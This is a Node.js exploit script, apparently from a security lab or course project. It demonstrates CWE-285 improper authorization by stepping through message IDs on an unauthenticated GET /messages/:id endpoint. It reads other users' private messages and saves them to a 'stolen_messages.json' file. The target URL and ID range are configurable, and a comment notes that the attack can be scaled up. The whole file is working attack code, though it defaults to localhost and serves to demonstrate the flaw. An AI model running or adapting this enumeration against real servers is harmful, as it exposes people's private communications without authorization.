// attack/exploit_messages.js


// CWE-285 Exploit Script: Demonstrates unauthorized access to private messages 
// by exploiting missing authorization checks on the message retrieval endpoint.


// This attack script demonstrates that there is no authorization check
// on GET /messages/:id and any user (or anonymous attacker).
// It can read all the private messages belonging to other users.


// Usage:
//   node exploit_messages.js [baseUrl] [maximumId]
//
// Parameters are explained below:
//   baseUrl (it is optional)   â€“   The base URL of the vulnerable server.
//                                  If not provided, it defaults to:  http://localhost:4000
//
//   maximumId (it is optional)  -  The maximum message ID the exploit script will try.
//                                  This script will attempt to access:
//                                      - /messages/1 up to /messages/maximumId
//                                      - If not provided, it defaults to 20.



// Example 1 (default settings: it defaults to:  http://localhost:4000 )
//   node exploit_messages.js
//      Exploits http://localhost:4000/messages/1..20


// Example 2 (Custom target and range):
//   This allows the attacker to scale the attack as the number of
//   stored messages grows in the vulnerable application.
//   node exploit_messages.js http://localhost:4000 50
//   -> Exploits http://localhost:4000/messages/1..50


const axios = require("axios");

const fs = require("fs");

const path = require("path");


// Configuration values that can be overridden using command-line arguments.
// If we want to point at a different host/port, it can be passed as the first argument.
const BASE_URL = process.argv[2] || "http://localhost:4000";

const MAX_MESSAGE_ID = parseInt(process.argv[3] || "20", 10);

const OUTPUT_FILE = path.join(__dirname, "stolen_messages.json");


// This is a small helper to wait between the requests.
function sleep(time_in_ms) {
    return new Promise(resolve => setTimeout(resolve, time_in_ms));
}

// This output format is designed to make it obvious what the script is doing.
function printBanner() {
    console.log("==================================================");
    console.log("   CWE-285 Exploit: Unauthorized Message Reader   ");
    console.log("==================================================\n");
    console.log(`Target endpoint : ${BASE_URL}/messages/:id`);
    console.log(`Output file     : ${OUTPUT_FILE}`);
    console.log(`Max message id  : ${MAX_MESSAGE_ID}\n`);
    console.log("Starting exploit... attempting to access protected messages.");
    console.log("Under correct authorization implementation, this request should fail.");
    console.log("Any successfully retrieved message indicates an access control weakness.\n");
}

// Helper function for printing one stolen record in a readable way.
function logStolenMessage(msg) {
    console.log(
        `[+] Stole message ${msg.id} | senderId=${msg.senderId},` +
        ` receiverId=${msg.receiverId} | content="${msg.content}"`
    );
}

// Main exploit routine: Iterates over message ids and call the vulnerable endpoint without any authentication.
async function exploit() {
    printBanner();

    const stolenMessages = [];
    let total_messages_exploited = 0;

    for (let id = 1; id <= MAX_MESSAGE_ID; id++) {
        try {
            const res = await axios.get(`${BASE_URL}/messages/${id}`);

            if (res.data && res.data.details) {
                const m = res.data.details;
                stolenMessages.push(m);
                total_messages_exploited++;
                logStolenMessage(m);
            } else {
                console.log(`[-] ID ${id}: unexpected response format`);
            }
        } catch (err) {
            if (err.response && err.response.status === 404) {
                console.log(`[-] ID ${id}: 404 Not Found`);
            } else {
                console.log(
                    `[#] ID ${id}: error -> ${err.message}`
                );
            }
        }

        // Optional delay to avoid overwhelming the server with requests.
        await sleep(50);
    }


    // Writing all the successfully stolen messages to an output file.
    // This preserves the evidence of the unauthorized data exposure.
    // It allows the stolen data to be reviewed after the exploit completes.
    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(stolenMessages, null, 2));

    console.log("\n==================================================");
    console.log("Exploit execution complete.");
    console.log(`Total private messages extracted without authorization: ${total_messages_exploited}`);
    console.log(`Stolen data has been saved at: ${OUTPUT_FILE}`);
    console.log("This confirms successful exploitation of CWE-285 (Improper Authorization).");
    console.log("==================================================");

}

// Starting the exploit when this file is executed directly.
exploit().catch(error => {
    console.error("Fatal error while running exploit:", error);
});
